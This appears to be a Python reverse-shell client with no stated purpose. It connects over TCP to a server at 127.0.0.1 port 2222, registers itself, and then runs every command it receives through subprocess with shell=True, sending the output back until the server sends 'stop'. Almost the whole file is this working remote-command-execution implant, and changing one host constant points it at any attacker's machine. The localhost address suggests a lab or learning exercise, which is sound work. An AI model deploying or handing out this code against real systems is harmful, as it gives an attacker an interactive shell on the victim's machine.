import socket
import subprocess

SERVER_HOST = "127.0.0.1"
CLIENT_HOST = "127.0.0.1"
PORT = 2222

MAX_BYTES_REPONSE = 65536
ENCODING = 'utf-8'
STOP_WORD = "stop"

def create_tcp_socket():
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def create_session_client(socket_object, client_host, server_host, port):
    # Connect to the server
    socket_object.connect((server_host, port))

    # Creating and sending a registration request to the server (The request is the client's host).
    registration_request = client_host
    socket_object.sendall(bytes(registration_request, encoding=ENCODING))

def execute_message(socket_object, message):
    # If the message exist, execute it.
    if message:
        try:
            result = subprocess.run(message, capture_output=True, text=True, shell=True, timeout = 5)
            return result
        except Exception as e:
            # Handle errors
            socket_object.sendall(bytes(f"Error executing command: {e}", encoding=ENCODING))
            return None
    else:
        socket_object.sendall(bytes("Error with recieving message", encoding=ENCODING))
        return None
    
def send_response(socket_object, result):
    if result:
        # Send the stdout, and stderr to the server.
        response = (result.stdout + result.stderr).strip()
        socket_object.sendall(bytes(response, encoding=ENCODING))



def main():
    with create_tcp_socket() as s:

        create_session_client(s, CLIENT_HOST, SERVER_HOST, PORT)
        
        # Running until "stop" is sent from the server.
        while True:

            # Wait, and recieve the message from the server.
            message = s.recv(MAX_BYTES_REPONSE).decode(ENCODING)

            # If the message is stop, stop the session.
            if message == STOP_WORD:
                break
            
            result = execute_message(s, message)

            send_response(s, result)


print("Done")

if __name__ == "__main__":
    main()